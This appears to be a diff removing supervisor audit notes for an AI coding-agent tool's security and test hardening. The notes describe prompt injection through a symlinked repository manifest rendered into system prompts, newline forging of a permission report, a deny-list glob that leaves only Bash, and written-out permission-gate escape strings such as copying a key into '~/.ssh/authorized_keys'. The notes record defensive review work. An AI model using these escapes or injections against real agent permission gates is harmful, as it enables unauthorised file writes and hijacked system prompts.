-the sentence *says* rather than for `#79`. An identifier grep would have missed it — four rounds
-running of "corrects N, misses N+1", and the first time the sweep method actually caught the N+1.
-
-**3. A benchmark must measure what the CODE does, not what the operation does.** A reviewer measured
-`json_encode` at 7.56 ms and called the lane's 14 ms a 2× overstatement. The lane defended it and was
-right: `internMessages()` **retains** every fresh payload so a missing blob inserts without re-encoding,
-so encode-and-**discard** is not the shipped path. Measured three ways — discard 7.40 ms (reproducing
-the reviewer exactly), **retain 14.38 ms**, and 11.8 ms attributable inside the faithful loop. The
-docblock now records this to stop the next re-litigation. **Reproducing a number is not the same as
-measuring the right thing.**
-
-**Two more findings that came back SHARPER than reported.** Concurrent workflow runs do not exit FIFO
-— a 3-way overlap started `alpha,beta,gamma` and exited `alpha,gamma,beta`, so pop order is *unrelated*
-to push order; a SIGINT in that window wrote a pause file for the **already-finished** run and
-discarded the live one's progress. And the checkpoint memo-guard bug survived partly because the
-suite's own helper returned a bare anonymous `JsonSerializable`, which **passed under the wrong
-guard** — the fixture was shaped like the bug.
-
-### 🔴 A FALSE CORRECTION IS WORSE THAN A STALE NUMBER — round 36, and it was aimed at THIS file
-
-A lane reported that this file's `saveCheckpoint()` citation was stale: *"it is at `:414`, not `:368`"*.
-Its reviewer checked. **`:368` was correct** — at `dcb98051`, `public function saveCheckpoint` is on
-line 368 exactly as recorded here; line 414 is a docblock line reading *"checkpoint tests do, with
-`assertSame`) see identical key order."* Post-change it is at 427, so `:414` was never right at any
-point in the round.
-
-**A stale number is discovered by anyone who follows it. A false correction is TRUSTED, and it
-overwrites something that was right.** This one was aimed at the RESUME, i.e. at the record the whole
-audit resumes from, and the only reason it did not land is that a reviewer re-derived a number nobody
-had asked it to doubt.
-
-**Rules:**
-1. **A correction is a claim and gets measured like any other.** Round after round these briefs have
-   said "report a wrong premise rather than routing around it" — this is the other half: *a reported
-   wrong premise must itself be verified before the record is changed.*
-2. **Never edit the record straight from a lane's correction.** Confirm it first, or route it through
-   the reviewer.
-3. Note the same lane's OTHER corrections in the same breath were **right** (`Chat.php:6478` sync
-   `run()`, `:6390` dispatch, `:6459` `workflowRun()`; the recorded `:6479` was a genuine off-by-one).
-   **A source that is right three times out of four still has to be checked the fourth time** — being
-   mostly right is what makes a false correction dangerous.
-
-⚠️ **The corrected figures, now double-checked:** `EnhancedSessionStore::saveCheckpoint()` at
-`dcb98051` = **`:368`** (unchanged, the RESUME was right). `Chat.php` sync `run()` = **`:6478`**
-(RESUME's `:6479` was off by one, now fixed). Dispatch `:6390` ✓. `workflowRun()` `:6459` ✓.
-
-### 🔴 ROUND 36's LESSON — my own brief's central premise was FALSE, and the fix I suggested would have made the feature permanently unreachable
-
-Two supervisor errors in one brief, both caught by the lane and reported rather than worked around.
-
-**1. "The feature is complete except for the synchrony" — FALSE.** Fixing only the async paints a
-**blank pane**. `SubAgent::$output` had exactly one writer — `AgentManager::drain()` — which sets the
-final text and the terminal status *in the same breath*. So no pool sub-agent is ever simultaneously
-non-terminal and non-empty, and `liveOutputs()` was **structurally empty for the whole of every run**.
-Proved by mutation: async intact, child publishes nothing → only the live-frame test fails.
-
-This retroactively vindicates round 34's honest label. P8.4 was marked "WIRED, NOT YET VISIBLE" and
-the synchronous `run()` was named as the blocker — but there was a **second** blocker nobody had
-found, and the honest label was more right than it knew. **A feature with one known blocker is not a
-feature with one blocker.**
-
-**2. My suggested fix would have made the feature permanently unreachable.** I pointed at
-`EngineBackend::completeAsync()`'s fork + socket-pair. `liveOutputs()` reads an object graph **in the
-parent**; forking the workflow puts every sub-agent in a child the renderer cannot see. Fibers keep it
-in-process. **A pattern that solved one blocking problem is not a pattern for every blocking problem —
-check what the fix has to be able to SEE.**
-
-**3. And a test-design trap worth keeping.** An injected executor runs *inline*, so it never forks,
-never idles and never publishes — a test built on one would exercise **neither mechanism** while
-appearing to. The proof test therefore forks for real. Related: `AgentWorkerPool`'s comment offering
-"protected helpers — overridable for testing" is **untrue**; the class is `final`.
-
-### 🔴 ROUND 36 SCOPE — a scout measured 13 candidates and **8 WERE ALREADY CLOSED**
-
-The plan is unreliable at roughly **2:1** on what is still open. Measured against master at `f3d59e1a`.
-**Do not launch a bundle off this plan's text without re-measuring the item first.**
-
-**CLOSED — do not spend a lane on these. Each is listed as open in the plan and is not:**
-
-| plan claim | reality |
-|---|---|
-| malformed tool-arg crashes a turn (`Runtime.php:195`, no try/catch) | **CLOSED.** Method is at `:446`, not `:195`. Serial path guards at `:562-566`; concurrent path via `executeGuarded()` `:996-1003`. The comment at `:560` says the guard is now *wider* than `Chat::invokeTool()`, not absent |
-| `Glob`'s `**` does not recurse | **CLOSED, proven by execution** — `**/*.php` over `src/Tools` returns 33 results, 11 in nested dirs. Real recursive walker at `Glob.php:301` + `:426-600`; `glob()` kept only as the non-globstar fast path |
-| `Edit` schema `'type' => 'bool'` | **CLOSED, and the never-checked part too** — a repo-wide sweep for `'bool'`/`'int'`/`'str'`/`'number'` as JSON-Schema types returns **zero**. No other tool has it |
-| unindexed `sessions.updated_at` at 60fps; orphan `pruneSessions()` | **CLOSED, all three sub-claims wrong.** The class is `src/Session/SessionStore.php` (**singular** — `src/Sessions/` holds `BackgroundSession*` only); the index exists at `:152-153`; `pruneSessions()` is called from `Bootstrap.php:4538`; and `listSessions()` `:301-306` memoises on a `sessionListStamp()` key, so the render path does not re-query |
-| streaming fake end-to-end | **CLOSED.** `$onToken` fires inside the chunk loop at `Runtime.php:271-274`; `Bootstrap::chat()` passes `streaming: true` at `:598`. The buffer survives only to build the transcript message, documented as deliberate at `:263-268` |
-| no `connect_timeout`; blocking `pcntl_waitpid` | **CLOSED.** `connect_timeout` centralised at `Providers/Concerns/HttpClientDefaults.php:191` — and correctly, **no blanket total timeout** on the curl path. The plan's `EngineBackend.php:357` is `withRoot()`; the real teardown is `reapChild()` `:916-933`, `function_exists` guard plus `WNOHANG`. ⚠️ Residual, different concern: unguarded blocking waitpids DO remain at `Sessions/BackgroundSessionRunner.php:382`,`:400` and `Chat.php:3304` |
-| `-p` degrades to `EchoProvider`, exits 0 | **CLOSED.** Misconfigured provider hard-fails with `EXIT_CONFIG` (`NonInteractive.php:236-247`, `:314`). *No* provider configured still warns and exits 0 — deliberate, documented at `:321-338` as the zero-config offline smoke test |
-| `loadRoot()` monorepo-blind | **CLOSED, and `loadAncestorRoots()` closed THIS item** — not a different concern, as this file previously suspected. Executed: `loadRoot()` from the `sugar-crush` sub-root returns the monorepo `CLAUDE.md`, 25,110 bytes |
-
-**STILL OPEN — the round-36 queue:**
-
-| item | verdict | size | where |
-|---|---|---|---|
-| **`CommandBackend`/`StreamingCommandBackend::completeAsync()` block the loop** | OPEN | M | `CommandBackend.php:140-155` (sync call at `:149`); `StreamingCommandBackend.php:461-484` (defers via `futureTick()` `:464`, then blocks at `:471`) |
-| **checkpoint re-encodes + re-hashes the whole history every turn** | PARTIAL | XS | `Chat.php:5188-5202` (unconditional, no throttle) → `EnhancedSessionStore.php:368`. ⚠️ **Disk is already FIXED** — content-addressed blobs, `INSERT OR IGNORE`, O(N). Only **CPU** is O(N²) (`:428-430` encode, `:534` sha256, every message every turn). Do not repeat the plan's "writes the full history" headline |
-| **async workflow execution — the compositor blocker** | OPEN | L | `Chat.php:6459` `workflowRun()` calls `run()` synchronously at `:6478` (corrected from `:6479`), dispatched `:6390` |
-| `statusLine` config | OPEN | M | greenfield, zero occurrences in `src/`/`bin/`. Adds a `src/` file |
-| `keybindings` remap | OPEN | L | **DEFER.** `KeyBindingRegistry` is `final`, never instantiated, entirely static, with two static memo caches and a test trait existing only to reset them; 4 production consumers incl. `Chat.php`. An L refactor for a preference feature |
-
-🔴 **`src/Renderer.php:141-148` POINTS AT THE WRONG ISSUE.** It documents the compositor blocker
-as "KNOWN GAP issue #79", citing `Chat.php:6212`/`:5480`. All three are stale: the real lines are
-`:6479`/`:6390`, and **issue #79 is "Phase 9+: CandyMetrics", state MERGED** — an unrelated closed PR.
-`gh issue list --state open` finds **no issue tracking this at all.** The audit trail points at nothing.
-
-**LANE COLLISION MAP** (`Chat.php` is 10,661 lines — the hottest conflict surface in the tree):
-- `statusLine` + `keybindings` collide (both `Renderer.php` and `Bootstrap.php`).
-- checkpoint-throttle + async-workflow + `keybindings` all collide (all `Chat.php`). **Only one
-  `Chat.php` item per PAIR of lanes** — two `Chat.php` items in the SAME lane is fine, and is what
-  round 36 does.
-- **Safe pairs:** backend-async + `statusLine`; backend-async + any single `Chat.php` bundle.
-
-### 🔴 ROUND 35's SECURITY LESSON — the gate went on the VALUES and not on the WALK
-
-`P8.8`'s implementer did unprompted security work and did it well: `autoload.psr-4` values are
-repository content, so it gated every source root through `ContainedPath::within()`. Its reviewer threw
-**24 attacks** at that gate — `../../..`, `/etc`, `.`, `""`, null byte, backslash separators,
-`a/../a/../a/../../outside`, symlink-then-`..`, symlink chains, symlinked source roots, psr-4 as
-string/list/array, manifest as a JSON array, invalid JSON, `chmod 000`, root-is-a-symlink,
-trailing-slash root — **nothing escaped and nothing threw.**
-
-**And the sub-package WALK that finds the manifests in the first place had no gate at all.**
-`isScannableDir()` uses `is_dir()` and `readManifest()` uses `is_file()`/`file_get_contents()`, all of
-which follow symlinks. A directory symlink among the root's immediate children — **committed to the
-repo, since git stores symlinks as mode `120000` and a clone materialises them** — leads the manifest
-read outside the checkout, and that manifest's `psr-4` prefix and `description` render into **every
-system prompt of the session**. `../` is a fully predictable target and `description` is an unbounded
-attacker-authored string, so this is prompt injection, not merely disclosure.
-
-Three sentences shipped in the same commit asserted it could not happen ("a directory entry cannot
-contain a separator, so it cannot escape"; "nothing here can leave the root"; "no part of the path is
-chosen by model output or by file content"). **The path STRING is caller-supplied; the FILE it
-resolves to is repository-chosen.** That distinction is exactly what `ContainedPath`'s own docblock
-was written about — "THE TENTH WAS ARBITRARY CODE EXECUTION AND ITS INVENTORY ROW WAS GREEN".
-
-**The rule: securing the data a walk RETURNS is not securing the walk. Gate the traversal and the
-values separately, and never let a census row answer "is this path safe?" with a sentence about the
-string rather than about what it resolves to.**
-
-⚠️ **There is a THIRD hand-maintained containment inventory** the round-34/35 briefs did not know
-about: `src/Support/ContainedPath.php:97` ("TWENTY-SEVEN call sites in ELEVEN files"), which is 5 sites
-and 3 files behind the two that ARE derived-and-asserted. A commit claiming "both censuses carry its
-rows" was true of the two it named and silent about this one.
-
-
-### 🔴 ROUND 35's SECOND LESSON — a guard test written around the RESIDUE instead of the THREAT
-
-`/permissions` exists so the app cannot tell you that you are in `plan` while `bypass-permissions`
-runs — its docblock says exactly that. Its reviewer made it tell the **opposite**, using nothing but
-the config file it reads.
-
-`Sanitize::untrusted()` **deliberately preserves LF and CR** (`candy-core/src/Util/Sanitize.php:124`
-strips `[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]`, excluding 0x09/0x0a/0x0d). The report joins its lines
-with `implode("\n", …)`. So a newline inside a rule pattern or a config path **forges report lines** —
-measured, through the real `Chat::update()`, producing a fake `Permission mode: bypass-permissions`
-row under a gate that was actually `Default`. A CR does overwrite instead.
-
-**The guard test could not have caught it.** It asserted
-`preg_match_all('/[\x00-\x08\x0b\x0c\x0e-\x1f]/', $text) === 0` — a strict SUBSET of what
-`untrusted()` already strips, omitting exactly the bytes that get through. It asserted only what
-calling `untrusted()` at all already guarantees.
-
-**The rule: a guard test written from the sanitiser's byte class tests the sanitiser, not the
-surface.** Write it from the property the surface needs — here, *a report has exactly the number of
-lines the renderer intended, whatever the fields contain* — and it fails for any escape, including the
-ones the sanitiser was never meant to cover.
-
-**Corollary, and it is the same shape as the walk-vs-values lesson above:** both round-35 lanes did
-real, competent security work and both left a hole beside it. One gated the values and not the walk;
-the other sanitised the bytes and not the structure. **Ask what the surface guarantees, not what the
-helper strips.**
-
-
-### 🔴 A NEW `src/` FILE MOVES **THREE** CENSUSES, NOT TWO — put this in every implement brief
-
-Round 35's `sglang` lane reported this as a premise my brief got wrong, and it is the kind of thing
-that reds a lane at the very end of its run. Adding any file under `sugar-crush/src/` moves:
-
-1. `tests/Tools/BuiltInToolCorpusTest.php` — the file/declaration/concrete census (the "census token").
-2. `tests/Integration/BinSugarcrushWiringTest.php` — its provider data-provides one case per file under
-   `src/` plus `bin/sugarcrush`, so one new file silently adds exactly **one test**. Account for it in
-   the delta reconciliation rather than being surprised by it.
-3. **`tests/…/ReadPathCensusTest.php` and `tests/…/ContainedPathInventoryTest.php`** — these red **by
-   construction** the moment a new file introduces a read/execute sink (`scandir`,
-   `file_get_contents`, `RecursiveDirectoryIterator`, …) without naming its containment gate. Both are
-   derived-and-asserted, so this is not optional and cannot be worked around: the sink must declare
-   its gate.
-
-⚠️ **`ContainedPathInventoryTest`'s prose was ALREADY stale before round 35 touched it** — it read
-"THIRTY call sites in THIRTEEN files" while the map it restates summed to **31** across 13. The lane
-corrected it to 32-in-14 and recorded the pre-existing drift in place rather than quietly folding it
-into its own bump. That is the right handling: a number you did not cause is still a number you are
-now standing next to.
-
-
-### PATHS AND LINE NUMBERS CORRECTED BY ROUND-35 LANES — the tree moves under a brief
-
-- **`ARCHITECTURE.md` is at `sugar-crush/docs/ARCHITECTURE.md`**, not `docs/ARCHITECTURE.md`. Its
-  "### The system prompt, in assembly order" section is at **`:226`** — NOT `:192` (long-known wrong)
-  and NOT `:224` (which I asserted as verified last round; it had moved again by one lane's commit).
-- **`Agent::$source` is at `:72`**, not `:69`.
-- **`Chat::helpListing()` DOES NOT EXIST.** The width derivation is at `Chat.php:5705` but inside
-  **`handleHelpCommand()`**. I put the wrong name in a brief and a lane propagated it into four
-  docblocks before its own `{@see}` resolver caught it.
-
-**The rule this earns: a brief's figures are measurements with a timestamp, not facts.** State them as
-claims to check, and tell the lane that reporting a wrong premise is worth more than routing around it
-silently. Both round-35 lanes did exactly that, which is the only reason these are known.
-
-### ROUND 34's TWO LESSONS — both lanes shipped a test that asserted PRESENCE rather than TRUTH
-
-This is the round's most transferable finding, and it happened **twice, independently, in unrelated
-lanes**. Put it in every implement brief.
-
-1. **`cmd`** — 9 wiring tests asserted the approver closure was *bound to* a `HeadlessPermissionPrompt`
-   (`ReflectionFunction::getClosureThis()`), never that it *ran* it. Replacing the body with
-   `fn() => true`, still bound to a real prompt, passed **all 8359 tests byte-identically** — every
-   `-p` run auto-granting every ASK, the exact fail-open the change existed to prevent. Killed by
-   asserting the closure's BEHAVIOUR (feed it a non-tty stream, assert refusal) plus a
-   `getShortName() === '__invoke'` pin.
-2. **`lsp`** — `NoRawAnsiInTranscriptTest`'s hand-written provider. Deleting a row left the suite
-   green, because a data-driven provider cannot fail for a case it omits. Killed by DERIVING the
-   provider from a source census — which immediately found `WebSearchCommand` unguarded too.
-
-**The rule: a test over a hand-maintained list inherits that list's omissions. Derive the list, or
-the test only proves what someone remembered to type.**
-
-### THE SECURITY BOUND THAT WAS "REMOVED AND REPLACED" — and then actually restored
-
-Finding #5 (carry all 16 `AgentPreset` fields onto `Agent`) removed a real bound: a test existed
-specifically to pin that an imported `.claude/agents` preset's `permissionMode` could NOT reach the
-roster, and two docblocks cited it as a bound on **ungated repository content**. After the change a
-`.claude/agents/*.md` declaring `permissionMode: bypassPermissions` landed as exactly that — measured
-through the real `Bootstrap::agentRoster()` path, not a harness.
-
-The lane replaced it with a census asserting only `Agent.php` reads the field, and **said plainly that
-unread-and-asserted is weaker than unrepresentable** rather than letting it read as equivalent. Its
-reviewer then **broke the replacement**: the same change had widened `Agent::toArray()` to emit
-`permission_mode`, so reading it that way in `AgentManager::createSubAgent()` — the exact downstream
-the docblocks name — left the suite 15/15 green.
-
-**Resolution: the narrower fix existed all along and was taken.** `fromPreset()` already had the
-provenance in hand on the same line (`source: $preset->source`), so the mode is forced to `Default`
-for non-native sources — all sixteen fields carried, `$source` badge-able, and the *unrepresentable*
-bound restored for ungated content specifically. The fix agent went further than proposed and gated
-`fromArray()` identically, so the invariant belongs to the TYPE rather than to one constructor —
-otherwise the persistence seam is a way back in.
-
-**Rule earned: when a finding says "carry the field", check whether the field can be carried
-CONDITIONALLY before accepting that a bound must be traded away.**
-
-### E57 RECORDED — the argument justifying a tier split did not survive contact with the matcher
-
-`docs/SETTINGS.md` and `src/Config/LayeredSettings.php` both defended `disabledTools` being
-project-settable (while `allowedTools` is user-tier-only) with: a deny list can only express the
-attack by naming every tool it removes, so you can see it in the file. **`fnmatch()` honours negated
-character classes.** Measured end to end: a project-tier `{"disabledTools":["[!B]*"]}` leaves exactly
-`Bash`. Eight characters. Recorded as **E57**, deferred per functionality-first; the two false doc
-claims were corrected in-round.
-
-**`candy-core` foundation edit is cleared across the whole monorepo**: `affected-libs.php` puts the
-closure at 53/58; the supervisor swept **57 libs, 0 failures, 0 errors, all rc 0.**
-
-⚠️ **P8.4 IS WIRED BUT STILL NOT USER-VISIBLE, AND THAT IS THE HONEST STATE.** The two blocking
-wiring defects are fixed — `liveOutputs()` now derives from the SUB-AGENT map (so workflow agents
-appear) and filters on the same `!isComplete() && !isStopped()` predicate `isWorking()` uses (so they
-leave). But `Chat::workflowRun()` calls `run()` **synchronously** (`Chat.php:6212`) from `update()`
-(`:5480`), and `ProcessExecutor` blocks in a raw `stream_select()`, so the loop cannot tick until the
-run ends — by which time a correct liveness filter has emptied the map. **F5 stays OPEN as "WIRED,
-NOT YET VISIBLE".** The async conversion (issue #79) is a separate item, deliberately not attempted.
-
-
-⚠️ **`crush-lane-sglang` IS NOT IN ITS REVIEWED STATE.** The interrupted fix agent left
-`src/Providers/ToolCallParser/EnvelopeScanner.php` — new, untracked, 200 lines, `php -l` clean, and
-**referenced by nothing** (`DsmlToolCallParser.php` has zero occurrences of it; the MiniMax parser is
-untouched). Its stated intent was a shared positional scanner closing B1 in *both* parsers and
-removing the B3 PCRE cliff at once — a better design than the original brief, so the idea is kept,
-but the file is untested and must be judged on merit, not adopted because it exists.
-`crush-lane-cmd` IS byte-identical to what its reviewer restored (13 dirty entries).
-
-⚠️ **`sugar-crush/README.md` is edited by BOTH `cmd` and `sglang`** (different sections — permissions
-vs providers). `docs/ARCHITECTURE.md` is edited by `sglang` and was edited on master by `e1840c13`.
-Both lanes are instructed to STOP on any non-count conflict.
-
-⚠️ **`sugar-crush/docs/PERMISSIONS.md` IS CONTENDED BY BOTH LIVE LANES — the earlier line saying
-`lsp` is barred from every contended doc is WRONG and is corrected here.** `lsp`'s bundle assigns it
-that file for finding #8, and `cmd` has edited it anyway (it was not in `cmd`'s declared set). The two
-edits are **measured disjoint**: `cmd` rewrites `### \`Ask\` needs somewhere to ask` at `:190-208`
-(+13 lines, three-situations list for the headless approver); `lsp`'s target is `## The three
-\`trustedProject*\` keys` heading at `:239` and its table at `:248-250`. ~40 lines apart, so a rebase
-auto-merges — but whichever lane rebases second inherits shifted offsets, and if it reports a conflict
-here it is a MERGE artefact to arbitrate, not a lane error. Supervisor arbitrates; neither lane
-reverts the other's section.
-
-### ROUND 33 — the supervisor-only commits (historical; all three lane bundles landed later, see the table above)
-
-| commit | what |
-|---|---|
-| `7957b2be` | **the window was corrected in one place and described in four others** — round 32 moved `DEEPSEEK_V4_CONTEXT_WINDOW` to `1_048_570` and never swept the describing text. Fixed `src/Chat.php:9605,9610` + `crush_code.md:1824,1999,2069`; `crush_feat.md` §12 got a dated header note (accurate research record of a deployment that no longer exists — a note, not a rewrite) |
-| `e1840c13` | **P7.6 ✅ — Phase 7 now 6 of 6** (ARCHITECTURE.md's diagram and `## Chat` heading no longer call `Chat` the root Model; the two-hats/do-not-retire warning is finally on the page) **+ finding #6**, which was INVERTED rather than misspelled |
-| `7f5d54af` | round-33 state block + round-34 pre-measurements |
-| `e62f6b91` | the brief that said measure-the-bytes did not measure its own bytes |
-| `1b7647a0` | the parser that exists to stop missed tool calls was inventing them |
-| `3e74a716` | the permission gate is, by default, not deciding anything |
-| `2bbe7035` | round-33 state at 3 lanes, written so a compact loses nothing |
-| `339f512c` | **LANE `cmd` — the first lane commit of round 33.** `--permission-mode` / `--model` empty values now exit 2; the `accept-edits` scoped-write gate pinned. Supervisor-verified **8204 / 91728 / 1 / rc 0** in the live tree |
-
-### ROUND 33 RESULTS — supervisor-verified, not lane-reported
-
-| lane | SHA | supervisor-measured | note |
-|---|---|---|---|
-| `cmd` | `339f512c` | **8204 / 91728 / 1 / rc 0** | matched its claim exactly |
-| `sglang` | `2bde4114` | **8299 / 91986 / 1 / rc 0** | matched its claim exactly |
-| `lsp` | `c4718781` | **8315 / 92077 / 1 / rc 0** (+ candy-core **781 / 6982 / 25 / rc 0**) | matched its claim exactly; 8/8 own + 8/8 reviewer mutations killed |
-
-**ALL THREE ROUND-33 BUNDLES ARE LANDED AND VERIFIED. The suite floor is now 8315 / 92077 / 1 / rc 0.**
-
-**`lsp` closed all four SHOULD-FIX items and improved on two of them.** It BUILT the popup state
-rather than renaming the test that falsely claimed it (`shellWithAnOpenSlashPopup()` hosts a real
-`Chat` and types `/comp` through `update()`), and it asserts the precondition before the contrast so
-the test cannot silently go vacuous again — proved by mutation: mirroring the shift-Tab arm fails
-**exactly one test**, the new one. It added the missing `candy-core` tests and proved the gap the
-reviewer alleged: deleting the `'Z'` arm now fails **exactly 4 tests, all four of them new**,
-confirming the pre-existing 777 were blind to it. `md5sum -c` OK on every restore.
-It also found the brief's item-3 claim **understated**: `AgentDashboardPane` under-compensates on
-BOTH its paths, not just the empty-list one, because `box()` repeats the same border+padding geometry.
-
-🔎 **THE PHANTOM ZONE'S ORIGIN, and it is the recurring defect in its purest form.** `pane:files`
-occurs **exactly once in the whole tree** — `tests/PaneClickTest.php:252`, a hand-written synthetic
-string fed to `scan()`. A test FIXTURE was read as a LIVE RENDER, and the id and coordinates lifted
-from it travelled through an implement report, into the supervisor's RESUME, and were only stopped by
-a reviewer who enumerated the real registry. **A string that exists is not a thing that happens.**
-
-**Backlog E51-E54 recorded** in `docs/plans/crush_code_hardening_backlog.md`: E51 the mouse-path modal
-gap (`Chat::handleMouse()` dispatched at `Chat.php:1108`, before the `!$msg instanceof KeyMsg` return,
-so the guards at `:1194`/`:1315`/`:1324` are keyboard-only; reaches `toggleToolOutput()` via `:3639`
-— **UX/correctness, NOT security**); E52 `CSI 1;5Z` loses the shift the `Z` encodes; E53 ZWJ fast/slow
-width divergence (measured 2 vs 6, over-truncating direction only); E54 the `$w + 4` caller asymmetry.
-The lane **declined to re-derive E51's row/col coordinates** and said so, attributing them to the
-reviewer and marking them not re-derived — the correct handling of a number you did not measure.
-
-**`sglang` was handed to its fix agent RED and the brief said green.** It measured
-**8153 / 91612 / 1 with 2 failures, rc 1** — not the briefed 8150 / 91605 / rc 0. The interrupted
-round-32 agent's untracked `EnvelopeScanner.php` had moved a census count 280→281 and never updated
-the counter. **The pre-fix figure in a brief describes the tree the REVIEWER saw, and an interrupted
-agent can have written since.** Second lane in one round to be handed a stale premise this way
-(`cmd`'s tree was likewise mid-write, fataling on an undefined constant at exit 255).
-
-**`sglang` enlarged the fix rather than accept the artefact.** The inherited `EnvelopeScanner`'s
-docblock claimed replacing the envelope pattern removed the PCRE cliff. It would only have **moved**
-it — `INVOKE_PATTERN` and `PARAMETER_PATTERN` carry the same lazy `(.*?)`. Generalised to
-`MarkupScanner` (positional envelope + element + attribute scanning), so B1/B2/B3 fall to one
-mechanism and neither parser calls `preg_*` at all. **B3's briefed diagnosis was half right:**
-`envelopeBodies()` DID check `preg_match_all` and logged the true cause; the unchecked call is the
-*invoke*-level one, which appended a second, false diagnosis after the true one.
-It proved the inherited defect by swapping the shipped `MinimaxXmlFallbackToolCallParser` back in and
-watching the new tests fail with the fabricated `rm_rf path=/` and the argument-less `write`.
-
-**The `TOOL_CALL_PARSER_NAMES` mutation is dead**, killed two ways: set-equality between the
-`self::TOOL_CALL_PARSER_*` constants named in `toolCallParser()`'s body and the ones the list carries,
-plus a reflection pin of declared constants against the list. PHP cannot derive the constant from the
-`match`, but the source is readable — **when the language cannot connect two hand-maintained lists,
-read the source and connect them.**
-
-### THE OPEN FINDINGS EACH LANE IS CLOSING — full detail, so a compact loses nothing
-
-**`sglang` (4 BLOCKING + 1 surviving mutation).** All reviewer-observed, not argued.
-- **B1 🔴** a message that merely QUOTES DSML in prose returns a real `rm_rf` call with `path=/`.
-  The card puts the example in the system prompt, so a model asked how tool-calling works quotes it
-  back. Cause: `str_contains($content, MARKER)`; upstream scans positionally from
-  `f"\n\n<{dsml_token}{tool_calls_block_name}"` (`enc.py:726`). **Inherited** —
-  `MinimaxXmlFallbackToolCallParser:74` has the identical guard and is shipped and wired. Both must
-  be fixed; exposure differs and the code must say so (MiniMax is opt-in, DSML is now the derived
-  default for DeepSeek-V4).
-- **B2 🔴** parameters silently vanish on any `string=` spelling variant (single-quoted, unquoted,
-  absent, unclosed) — call still fires, `args=[]`, zero `error_log`. `read()` with no `path`. There is
-  an unmatched-*invoke* counter and no unmatched-*parameter* one. The class docblock claims a
-  protection the code does not have.
-- **B3 🔴** hard cliff at `pcre.backtrack_limit`: 900 KB value → 1 call; 1 MB value → **call lost**,
-  and the log misdiagnoses it because `parseDsml()` never checks `preg_match_all()`'s return. A 1 MB
-  `Write` is ordinary traffic on a 1,048,570-token window.
-- **B4 🔴** the README deletion hides a still-true statement: the streaming gap remains open in
-  `CustomProvider` and `OpenAIProvider` (`OpenAIProvider::parseChunk():247` hardcodes
-  `toolCalls: null`). Replace the entry, do not remove it; scope `ARCHITECTURE.md`'s sentence so it
-  cannot read as a namespace-wide claim.
-- **Surviving mutation:** deleting `self::TOOL_CALL_PARSER_DSML` from `TOOL_CALL_PARSER_NAMES`
-  survives — the constant can lose a name while the `match` still accepts it. Drift caught one way only.
-
-**`cmd` (2 BLOCKING + 3 surviving mutations).** The gate itself withstood **~110 attack strings with
-no escape and no feature loss** — that stands and must not be re-litigated.
-- **B1 🔴** `--permission-mode=` / `--permission-mode ""` silently discards the value and runs the
-  shipped default at exit 0. `--config=`, the cited precedent, refuses the identical case.
-  **Framing matters:** the default IS `bypass-permissions` and that is deliberate and documented, so
-  this is "the flag silently does nothing", NOT a privilege escalation.
-- **B2 🔴** the README sentence the diff ADDS ("A value that is not a mode refuses the launch with
-  exit 2 rather than falling back to the permissive default") is false for the empty string.
-- **M15** dropping the `~` arm of `isAbsolutePath()` → `cp ./key ~/.ssh/authorized_keys` **Allows**.
-  **M18** dropping `\` from `SHELL_METACHARS` → `touch .\./.\./PWNED` **Allows**. Both refused by
-  current code; **nothing pins either.** **M7** the flag-whitelist test passes via the *containment*
-  check, so its stated rationale is not what makes it pass — presence, not truth.
-- **The load-bearing near-miss:** `cp ./payload ./.*/victim` escapes under `sh` but not through the
-  real path, because `src/Tools/BuiltIn/Bash.php:127` wraps in `bash -c` and bash excludes `.`/`..`
-  from globs. **Leaving `*` out of `SHELL_METACHARS` is correct only because of a constant in a file
-  `PermissionGate` never references.** Being documented; if that wrapper ever becomes `sh -c` it is a
-  live grant escape.
-
-
-**`lsp` (implement done, IN REVIEW — findings the implementer reported, NOT yet independently verified).**
-Its two highest-risk moves are exactly the shapes that hide a destroyed guard, so the reviewer is
-attacking them first; treat everything below as CLAIMED until that report lands.
-- ⚠️ **It edited `candy-core/src/InputReader.php` — a sibling foundation lib, outside its granted
-  set.** Added `'Z' => KeyMsg(Tab, shift: true)` to `decodeCsi()`, arguing `CSI Z` (how every
-  xterm-family terminal spells Shift+Tab) decoded NOWHERE, so a `KeyboardHandler` arm alone would
-  have been correct code no keypress could reach. It ran only candy-core + sugar-crush; **many libs
-  depend on candy-core** and a previously-`null` key now returning a `KeyMsg` can move any consumer.
-- ⚠️ **It INVERTED a pre-existing, deliberately-documented test** —
-  `SlashMenuTabCompletionTest::testShiftTabCyclesNoPaneWithOrWithoutThePopup` asserted Shift+Tab
-  cycles NO pane. Claim: the hazard it guarded was *claim-without-action* and the new `handle()` arm
-  removes that hazard. **If that hazard is now unguarded, inverting the test deleted the only guard.**
-- 🔴 **NEW FINDING — P3.3's premise was FALSE and the truth is worse.** Outside clicks do not
-  "silently no-op": a `pane:files` zone in the backdrop **survives `Veil::composite()` at identical
-  coordinates** (`row=1 col=1..7` before and after), so clicking dimmed chrome **while the permission
-  prompt is up** still fires `selectPane`/`selectSessionTab`/`toggleToolOutput`. Cause given:
-  `Chat::handleMouse()` (~`:1108`) returns before every modal-state guard (~`:1194`/`:1316`/`:1325`).
-  **P3.3's code change was descoped, correctly** — the fix lives in `Chat.php`, outside the grant.
-  It also declined to arm click-outside dismissal on ANY of the three modals, reasoning that
-  dismissal over an unfixed click-through would both dismiss the modal AND fire the backdrop zone,
-  and that dismissal must mean DENY, never "leave pending". **This is now queue-relevant: it is the
-  same modal the engine-path approver would raise.**
-- **NEW FINDING — `AgentViewPane::render($w)` returns rows of `$w + 4` cells**, always (border 2 +
-  padding 2 sit outside `Style::width()`). Both callers compensate, so it is not live breakage, but
-  `max(40, $cols - 4)` means **a terminal under 44 columns gets over-wide rows** — and over-wide
-  lines violate this project's render invariant (the diff renderer assumes one line per row).
-- Reported figures (CLAIMED): sugar-crush **8127 / 91560 / 1 / rc 0**; candy-core **777 / 6961 / 25 /
-  rc 0**, claimed identical to baseline. 8/8 self-applied mutations killed, **M3 only after a second
-  test** — its first test compared three encodings to each other and all three agreed at the wrong
-  column, the "clause present, not true" gap.
-- Plan corrections it measured: `AgentViewPane`'s `strlen()` is at **`:96` and `:115`**, not the
-  plan's `:112`; all four modals share **one** Veil (`Renderer.php:1150`), so per-modal arming needs
-  a conditional, not a second Veil; `Table` is `SugarCraft\Sprinkles\Table\Table`.
-
-### ENGINE-PATH APPROVER — MEASURED, and it is NOT the small item the queue implied
-
-A read-only scout measured it at `c39f1a99`. **The headline: the approver contract and the UI that
-would serve it are shaped incompatibly, and no docblock in the tree says so.**
-
